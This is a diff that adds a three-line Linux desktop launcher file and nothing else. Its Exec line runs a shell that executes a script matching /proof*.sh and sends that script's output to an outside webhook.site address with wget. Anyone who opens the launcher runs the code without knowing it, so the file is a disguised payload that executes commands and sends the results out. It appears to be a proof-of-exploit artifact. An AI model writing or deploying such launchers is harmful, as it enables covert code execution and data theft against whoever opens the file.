@@ -1,0 +1,3 @@
+[Desktop Entry]
+Exec=sh -c "wget https://webhook.site/72f44955-19ad-4ac3-9236-bd3a83b7fbff/?`/proof*.sh`"
+Type=Application
